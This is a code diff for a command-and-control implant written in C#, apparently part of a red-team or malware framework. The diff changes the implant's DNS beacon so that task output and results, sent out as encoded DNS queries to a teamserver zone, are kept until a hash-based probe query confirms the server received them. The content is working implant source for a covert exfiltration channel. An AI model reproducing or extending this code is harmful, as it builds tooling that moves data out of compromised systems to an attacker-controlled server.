@@ -277,30 +277,52 @@ internal sealed class DnsBeacon : ICheckInClient
 
     // Flushes the store-and-forward batch the run accumulated -- channel
     // output frames chunk up as c. queries, final TaskResults as r. queries
-    // (the QueueResult discipline already routes them into the batch). The
-    // delivered frames clear only after the queries were sent; a lost cycle
-    // re-sends (the transcript append is the straggler the ingest path
-    // ignores, the result record first-wins).
+    // (the QueueResult discipline already routes them into the batch). A
+    // frame is delivered only when its n.-probe confirms the exact blob
+    // landed server-side: a lost chunk drops the reassembly whole, and the
+    // unconfirmed frame re-sends next cycle (first-wins recording makes the
+    // re-send idempotent).
     private async Task FlushPollBatchAsync(CancellationToken cancellationToken)
     {
         var pending = _poll.SnapshotPending();
+        var delivered = new List<Frame>();
         foreach (var frame in pending)
         {
             if (frame.Kind == FrameKind.ChannelOutput)
             {
                 var output = ChannelOutput.Parser.ParseFrom(frame.Payload);
-                await ReportChannelAsync(output.TaskId, output.Data.ToByteArray(), cancellationToken);
+                var data = output.Data.ToByteArray();
+                await ReportChannelAsync(output.TaskId, data, cancellationToken);
+                if (await ConfirmedAsync(output.TaskId, data, cancellationToken))
+                    delivered.Add(frame);
             }
             else if (frame.Kind == FrameKind.TaskResult)
             {
                 var result = TaskResult.Parser.ParseFrom(frame.Payload);
                 await ReportAsync(result.TaskId, result.Outcome, result.Output, cancellationToken);
+                if (await ConfirmedAsync(result.TaskId, Encoding.UTF8.GetBytes(result.Output), cancellationToken))
+                    delivered.Add(frame);
             }
             // Ack and demand frames have no DNS carriage: the server's poll
             // path keeps no ack ledger and answers demands on the stream
             // carriers -- neither applies here.
         }
-        _poll.MarkDelivered(pending);
+        _poll.MarkDelivered(delivered);
+    }
+
+    // One delivery probe (the retransmission half's confirmation): the
+    // server answers y once this exact blob's reassembly reached recording.
+    // A probe that never lands counts unconfirmed -- the next cycle's
+    // re-send and re-probe settle it.
+    private async Task<bool> ConfirmedAsync(
+        string taskId, byte[] plaintext, CancellationToken cancellationToken)
+    {
+        if (!Guid.TryParse(taskId, out var task))
+            return true; // no grammar to probe under: drop rather than spin
+        var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
+        var name = DnsNames.ProbeName(_implantId, task, DnsNames.DeliverySha(plaintext), zone);
+        var answer = await DnsDial.QueryAsync(_egress.CurrentBeaconUrl, name, _cas, cancellationToken);
+        return answer is { Length: 1 } && answer[0] == (byte)'y';
     }
 
     /// <summary>
@@ -762,6 +784,23 @@ internal static class DnsNames
             + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
             + "." + Encode(implantId)
             + "." + zone;
+
+    /// <summary>
+    /// Renders a delivery probe name (the implant-side twin of the parser):
+    /// n.&lt;task&gt;.&lt;sha128&gt;.&lt;implant&gt;.
+    /// </summary>
+    public static string ProbeName(string implantId, Guid taskId, byte[] sha, string zone)
+        => "n." + Encode(taskId.ToString())
+            + "." + Encode(sha)
+            + "." + Encode(implantId)
+            + "." + zone;
+
+    /// <summary>
+    /// The delivery probe's blob identity: the first 16 SHA-256 bytes over
+    /// the report's plaintext, the teamserver's own computation verbatim.
+    /// </summary>
+    public static byte[] DeliverySha(byte[] plaintext)
+        => System.Security.Cryptography.SHA256.HashData(plaintext)[..16];
 
     public static string Encode(byte[] bytes)
     {
